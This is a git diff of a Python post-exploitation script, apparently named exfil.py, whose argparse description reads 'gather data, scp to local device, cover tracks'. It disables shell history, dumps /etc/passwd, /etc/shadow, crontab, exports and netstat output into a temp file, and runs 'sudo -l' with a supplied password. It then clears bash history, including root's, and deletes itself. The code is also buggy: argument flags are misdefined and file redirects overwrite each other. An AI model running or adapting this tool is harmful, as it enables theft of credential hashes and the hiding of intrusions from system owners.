@@ -6,12 +6,22 @@
 
 import os
 import platform
+import argparse
 
 
-def extract_clear():
+# get arguments for IP and password
+parser = argparse.ArgumentParser(description="gather data, scp to local device, cover tracks")
+parser.add_argument("-i", "--ip", help="specify local IP to scp (secure copy) data file to", action="store_true", required="True")
+parser.add_argument("-p", "--password", help="specify user password if know", action="store_true")
+args = parser.parse_args()
+local_path = args.ip 
+password = args.password
+
+
+def extract_clear(local_path):
     # confirm user wants to permanently delete logs and alter bach environment variables
     print("this script will permanently delete logs and alter bash envs...")
-    print("are you sure you want to continue?")
+    print("do you want to gather system data and export it to local machine?")
     answer = input("(yes/no): ")
 
     if answer == "no":
@@ -20,7 +30,7 @@ def extract_clear():
         # get local machine ip
         local_path = input("local IP and file save path (10.0.0.1/home/file.txt): ")
 
-        # disabling history
+        # disable history logging
         print("\ndisabling history logging...")
         os.system("unset HISTFILE")
         os.system("export HISTSIZE=0")
@@ -34,7 +44,7 @@ def extract_clear():
         # write data to file
         print("### exfiltrating data... ###")
 
-        print("\n### system info: ###")
+        print("\n### system info (not writing to file): ###")
         my_system = platform.uname()
         print(f"system: {my_system.system}")
         print(f"node name: {my_system.node}")
@@ -43,17 +53,30 @@ def extract_clear():
         print(f"machine: {my_system.machine}")
         print(f"processor: {my_system.processor}")
 
-        print("\n### /etc/passwd: ###")
-        os.system("cat /etc/passwd > /tmp/data_exfil.txt")
-        os.system("cat /etc/passwd")
+        # get system info and write to data file
+        print("")
+        os.system("id > /tmp/data_exfil.txt")
+        os.system("whoami > /tmp/data_exfil.txt")
+        os.system("netstat -tnpl > /tmp/data_exfil.txt")
+        os.system("id")
+        os.system("whoami")
+        os.system("netstat -tnpl")
 
-        print("\n### /etc/crontab: ###")
-        os.system("cat /etc/crontab >> /tmp/data_exfil.txt")
-        os.system("cat /etc/crontab")
+        print("\n### /etc/passwd: ###")
+        os.system("cat /etc/passwd >> /tmp/data_exfil.txt")
+        os.system("cat /etc/passwd")
 
         print("\n### /etc/shadow: ###")
         os.system("cat /etc/shadow >> /tmp/data_exfil.txt")
         os.system("cat /etc/shadow")
+
+        print("\n### /etc/hosts: ###")
+        os.system("cat /etc/hosts")
+        os.system("cat /etc/hosts")
+
+        print("\n### /etc/crontab: ###")
+        os.system("cat /etc/crontab >> /tmp/data_exfil.txt")
+        os.system("cat /etc/crontab")
 
         print("\n### /etc/exports: ###")
         os.system("cat /etc/exports >> /tmp/data_exfil.txt")
@@ -72,18 +95,22 @@ def extract_clear():
         extract_clear()
 
 
-# ask if passwd is know, if yes run sudo -l
-def cred_info():
-    cred = input("do you know user's passwd? (yes/no): ")
-    if cred == "no":
-        exit()
-    elif cred == "yes":
-        passwd = input("passwd: ")
-        print("\n### running sudo -l: ###")
-        os.system(f"timeout -k 3 3 sudo -l -S {passwd}")
-        exit()
-    else:
-        cred_info()
+# detect if pwd was given as option, if so, run sudo -l
+if args.password:
+    def cred_info(password):
+        cred = input("do you know user's passwd? (yes/no): ")
+        if cred == "no":
+            exit()
+        elif cred == "yes":
+            passwd = input("passwd: ")
+            print("\n### running sudo -l: ###")
+            os.system(f"timeout -k 3 3 sudo -l -S {password}")
+            exit()
+        else:
+            cred_info()
+else:
+    exit()
+
 
 # ask to clear logs and delete script from local machine
 def delete_file():
@@ -102,10 +129,17 @@ def delete_file():
         os.system("history -c")
         os.system("history -w")
         os.system("echo ' ' > ~/.bash_history")
+        os.system("echo ' ' > /root/.bash_history")
+
         print("\n### deleting data file and script... ###")
         os.system("rm -rf /tmp/.data")
-        os.system("rm exfil.py")
+        os.system("rm -f exfil.py")
         exit()
     else:
         print("didn't write yes or no!!!")
         delete_file()
+
+
+extract_clear(local_path)
+cred_info(password)
+delete_file()
